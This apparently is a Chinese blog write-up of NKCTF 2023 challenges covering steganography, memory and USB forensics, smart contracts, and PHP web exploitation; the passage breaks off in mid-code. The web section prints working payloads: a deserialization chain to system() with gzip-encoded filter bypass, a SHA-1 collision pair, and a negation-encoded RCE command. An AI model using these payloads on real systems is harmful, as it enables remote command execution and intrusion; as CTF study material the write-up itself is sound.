python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;5.png&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>   <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;6.png&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> g:<br>      g.write(f.read()[::-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><p>修改高度，得到压缩包的密码<code>be8b06bc13780abf</code></p><p>解压出的<code>GGGGGGG.png</code>结尾有串字符<code>5D93CEB70E2BF5DAA84EC3D0CD2C731A</code></p><p>32位的，推测为md5，在线网站得到<code>qwer1234</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/%E4%BA%94%E5%B9%B4Misc%EF%BC%8C%E4%B8%89%E5%B9%B4%E6%A8%A1%E6%8B%9F-2.png"></p><p>拿这个密码去跑<code>cloacked-pixel</code>，得到下一层压缩包密码<code>f442212b3d398a8e</code></p><p>根据提示是steghide爆破，那直接用stegseek跑了，得到下一层密码<code>764dc6c0361fc0fd</code></p><p>看文件头，明显的F5隐写，得到下一层密码<code>un7pXkXMD6J5P5jKzP3FCCVJ4VFtTF26</code></p><p>wav文件，一听就是sstv了，得到<code>NKCTF&#123;iLiKECTFbec@u5eDreaM!&#125;</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/%E4%BA%94%E5%B9%B4Misc%EF%BC%8C%E4%B8%89%E5%B9%B4%E6%A8%A1%E6%8B%9F-3.png"></p><h2 id="baby-bitlocker"><a href="#baby-bitlocker" class="headerlink" title="baby_bitlocker"></a>baby_bitlocker</h2><p><strong>赛后复现</strong></p><p>先做<code>2023.3.2</code></p><p>看的出来，出题人很喜欢明文攻击</p><p><a href="https://pcapng.com/">pcapng文件格式</a></p><p><code>echo &quot;4D 3C 2B 1A 01 00 00 00 FF FF FF FF FF FF FF FF&quot; | xxd -r -ps &gt; plain.txt</code><br><code>bkcrack -C crack.zip -c usb.pcapng -p plain.txt -o 8</code><br><code>bkcrack -C crack.zip -k 92ac142d 9bd136b1 ac01a95d -U out.zip easy</code></p><p>解压后得到<code>tonF.docx</code>和<code>usb.pcapng</code></p><p>对数据包分析，发现是usb键盘流量，使用<code>UsbMiceDataHacker</code>提取<br><code>PassWord:&lt;SPACE&gt;NKCTF2023_YYDS_YYDS!!!&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;</code></p><p>docx密码为<code>NKCTF2023_YYDS_YYDS!!!</code></p><p>进入文档后发现字体为<code>Byxs20_font</code></p><p>且文档中的内容复制后与文档内不一样了</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_bitlocker-1.png"></p><p>odttf转ttf</p><p>打开<code>/word/fontTable.xml</code>，得到<code>font-name</code>为<code>Byxs20_font</code>，<code>fontKey</code>为<code>&#123;F68B8FDC-D4B4-41D4-A738-3B7577EC3C9A&#125;</code></p><p>将<code>\word\fonts\font1.odttf</code>重命名为<code>F68B8FDC-D4B4-41D4-A738-3B7577EC3C9A.odttf</code></p><p>python转换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br>odttf_name = <span class="hljs-string">&quot;./F68B8FDC-D4B4-41D4-A738-3B7577EC3C9A.odttf&quot;</span><br>odttf_path = os.path.abspath(odttf_name)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(odttf_path, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    data = f.read()<br><br><span class="hljs-comment"># 获取文件名</span><br>file_name = os.path.splitext(odttf_path)[<span class="hljs-number">0</span>].split(<span class="hljs-string">&quot;\\&quot;</span>)[-<span class="hljs-number">1</span>].replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-comment"># 获取key</span><br>key = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(file_name), <span class="hljs-number">0</span>, -<span class="hljs-number">2</span>):<br>    key.append(<span class="hljs-built_in">int</span>(file_name[i-<span class="hljs-number">2</span>:i], <span class="hljs-number">16</span>))<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./font1.ttf&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        f.write(<span class="hljs-built_in">bytes</span>([data[i] ^ key[i % <span class="hljs-built_in">len</span>(key)]]))<br>    f.write(data[<span class="hljs-number">32</span>:])<br></code></pre></td></tr></table></figure><p>fontforge识别</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_bitlocker-2.png"></p><p>得到一半flag：<code>nkctf&#123;ttf_is_funny_</code></p><p>接着做<code>2023.3.4</code></p><p>内存取证<br><code>python vol.py -f memory.raw --profile=Win7SP1x64 filescan | grep -iE &quot;flag|.zip$|.rar$|.7z$|.txt$|.png$|.jpg$|.gif$|.pdf$|.doc$|.docx$|.pcapng$|.raw$|.kdbx$&quot;</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_bitlocker-3.png"></p><p>提取<code>PYTHON.rar</code></p><p><code>python vol.py -f memory.raw --profile=Win7SP1x64 dumpfiles -Q 0x0000000017f55070 -D ./</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_bitlocker-4.png"></p><p>用这个密钥恢复加密分区</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_bitlocker-5.png"></p><p>得到<code>bitlocker_is_very_interesting&#125;</code></p><p>最后看<code>2023.3.3</code></p><p>hint：<code>flag2图片十分有规律的3x3，到底是来自几进制的秘密呢？</code></p><p>根据提示<code>3x3</code>，猜测是4进制</p><p>exiftool得到提示<code>上北下南左西右东</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_bitlocker-6.png"></p><p>python提取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br><br>img = cv2.imread(<span class="hljs-string">&quot;./flag2.png&quot;</span>,cv2.IMREAD_UNCHANGED)<br><br>r,c = img.shape<br><br><span class="hljs-comment">#flag_xy = [(0,0),(2,0),(1,1),(0,2),(2,2)]</span><br>flag2_xy = [(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>),(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>),(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>),(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)]<br><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,r,<span class="hljs-number">3</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,c,<span class="hljs-number">3</span>):<br>        roi_img = img[y: y+<span class="hljs-number">3</span>, x: x+<span class="hljs-number">3</span>]<br><br>        <span class="hljs-comment">#for i in flag_xy:</span><br>        <span class="hljs-comment">#    print(chr(roi_img[i[::-1]]),end=&quot;&quot;)</span><br><br>        tmp = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag2_xy:<br>            tmp += <span class="hljs-built_in">str</span>(roi_img[i[::-<span class="hljs-number">1</span>]])<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(tmp,<span class="hljs-number">4</span>)),end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p>得到<code>flag2 is here: images_are_fun_</code></p><p>三段flag拼接起来<code>NKCTF&#123;TTF_IS_FUNNY_IMAGES_ARE_FUN_BITLOCKER_IS_VERY_INTERESTING&#125;</code></p><h1 id="Blockchain"><a href="#Blockchain" class="headerlink" title="Blockchain"></a>Blockchain</h1><h2 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h2><p>区块链浏览器打开地址，flag存储在变量中，在插槽中转换类型为text</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/signin-1.png"></p><h2 id="HelloWorld"><a href="#HelloWorld" class="headerlink" title="HelloWorld"></a>HelloWorld</h2><p>nc后先创建部署题目的合约账户<br>水龙头转账，部署合约</p><p>查看合约代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity 0.8.7;<br><br>contract HelloWorld &#123;<br>    string greeting;<br><br>    constructor(string memory _greeting) public &#123;<br>        greeting = _greeting;<br>    &#125;<br><br>    function greet() public view returns (string memory) &#123;<br>        return greeting;<br>    &#125;<br><br>    function setGreeting(string memory _greeting) public &#123;<br>        greeting = _greeting;<br>    &#125;<br><br>    function isSolved() public view returns (bool) &#123;<br>        string memory expected = &quot;Hello,NKCTF2023&quot;;<br>        return keccak256(abi.encodePacked(expected)) == keccak256(abi.encodePacked(greeting));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>调用<code>setGreeting</code>改<code>greeting</code>的值即可</p><p>在<code>metamask</code>中链接题目给的私链</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/HelloWorld-2.png"></p><p>使用<code>remix ide</code></p><p>编译后指定题目部署的地址</p><p>调用<code>setGreeting</code>，参数输出字符串<code>&quot;Hello,NKCTF2023&quot;</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/HelloWorld-3.png"></p><p>在Metamask确认交易请求</p><p>等待交易打包，确认上链</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/HelloWorld-1.png"></p><h2 id="decompile-revenge"><a href="#decompile-revenge" class="headerlink" title="decompile_revenge"></a>decompile_revenge</h2><p>与第一题一样，不过sha256加密了<br>在提供的网站上解</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/decompile_revenge-1.png"></p><p><code>NKCTF&#123;This_1s_Decompile_Rev3nge!!!!&#125;</code></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="baby-php"><a href="#baby-php" class="headerlink" title="baby_php"></a>baby_php</h2><p>反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Welcome</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;oww!man!!&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-string">&#x27;ItS SO CREAZY&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;name == <span class="hljs-string">&#x27;welcome_to_NKCTF&#x27;</span>)&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;arg;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/f|l|a|g|\*|\?/i&#x27;</span>, <span class="hljs-variable">$string</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;you are bad&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Happy</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$shell</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$shell</span> = <span class="hljs-variable language_">$this</span>-&gt;shell;<br>            <span class="hljs-variable">$cmd</span> = <span class="hljs-variable language_">$this</span>-&gt;cmd;<br>            <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$cmd</span>);<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$shell</span>(<span class="hljs-variable">$cmd</span>));<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hell0</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;func;<br>            <span class="hljs-variable">$function</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>]))&#123;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>]);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>最终需要在Happy类中执行eval，<code>__invoke</code>在将对象当作函数来使用时调用此方法，在<code>Hell0</code>类中可以调用函数<code>$function()</code>以触发<code>__invoke</code>，而调用函数需要触发<code>__toString</code>方法，而在<code>Welcome</code>类中存在<code>echo</code>，可以触发<code>__toString</code></p><p>反序列化后会有一个waf方法来检查<code>$cmd</code>中的值是否存在<code>f</code>,<code>l</code>,<code>a</code>,<code>g</code>,<code>*</code>,<code>?</code></p><p>列目录：<code>dir /</code></p><p><code>O:7:&quot;Welcome&quot;:2:&#123;s:4:&quot;name&quot;;s:16:&quot;welcome_to_NKCTF&quot;;s:3:&quot;arg&quot;;O:5:&quot;Hell0&quot;:1:&#123;s:4:&quot;func&quot;;O:5:&quot;Happy&quot;:2:&#123;s:5:&quot;shell&quot;;s:6:&quot;system&quot;;s:3:&quot;cmd&quot;;s:5:&quot;dir /&quot;;&#125;&#125;&#125;</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_php-1.png"></p><p>读<code>/f1ag</code>：使用<code>gzdecode</code>编码绕过</p><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">//$cmd=&#x27;system(&quot;more /*&quot;);&#x27;;</span><br><span class="hljs-comment">//echo urlencode(gzencode($cmd));</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Welcome</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;welcome_to_NKCTF&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;Hell0&#x27;</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Happy</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$shell</span>=<span class="hljs-string">&#x27;gzdecode&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&#x27;%1F%8B%08%00%00%00%00%00%00%0A%2B%AE%2C.I%CD%D5P%CA%CD%2FJU%D0%D7R%D2%B4%06%00%7B%96%1Bo%12%00%00%00&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hell0</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>=<span class="hljs-string">&#x27;Happy&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Welcome</span>();<br><span class="hljs-variable">$a</span>-&gt;arg = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hell0</span>();<br><span class="hljs-variable">$a</span>-&gt;arg-&gt;func = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Happy</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>O%3A7%3A%22Welcome%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A16%3A%22welcome_to_NKCTF%22%3Bs%3A3%3A%22arg%22%3BO%3A5%3A%22Hell0%22%3A1%3A%7Bs%3A4%3A%22func%22%3BO%3A5%3A%22Happy%22%3A2%3A%7Bs%3A5%3A%22shell%22%3Bs%3A8%3A%22gzdecode%22%3Bs%3A3%3A%22cmd%22%3Bs%3A38%3A%22%1F%8B%08%00%00%00%00%00%00%0A%2B%AE%2C.I%CD%D5P%CA%CD%2FJU%D0%D7R%D2%B4%06%00%7B%96%1Bo%12%00%00%00%22%3B%7D%7D%7D</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_php-2.png"></p><h2 id="eazy-php"><a href="#eazy-php" class="headerlink" title="eazy_php"></a>eazy_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>] != <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>] != (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;d&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;d&#x27;</span>]))&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;e&#x27;</span>] != <span class="hljs-number">114514</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;e&#x27;</span>]) == <span class="hljs-number">114514</span>)&#123;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;NS_CTF.go&#x27;</span>]))&#123;<br>                    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>                        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[0-9a-zA-Z]/i&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>                            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>                        &#125;<span class="hljs-keyword">else</span>&#123;<br>                            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!!!!!&#x27;</span>);<br>                        &#125;<br>                    &#125;<span class="hljs-keyword">else</span>&#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!!!!&#x27;</span>);<br>                    &#125;<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!!!&#x27;</span>);<br>                &#125;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!!&#x27;</span>);<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!&#x27;</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!&#x27;</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>第一层md5弱比较，使用数组绕过<br><code>a[]=1&amp;b[]=2</code></p><p>第二层sha1强比较<br><code>c=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;d=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</code></p><p>第三层数字比较缺陷，使用小数类型<br><code>e=114514.20</code></p><p>第四层php变量值特性，使用<code>[</code>代替<code>_</code><br><code>NS[CTF.go</code></p><p>第五层无字母数字rce，使用取反<br><code>cmd=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98);</code></p><h2 id="easy-cms"><a href="#easy-cms" class="headerlink" title="easy_cms"></a>easy_cms</h2><p>访问后台<code>/dede/</code>，用户名<code>admin</code>，密码<code>admin</code></p><p>左侧核心栏中有个文件式管理器，可以上传文件</p><p>存在过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 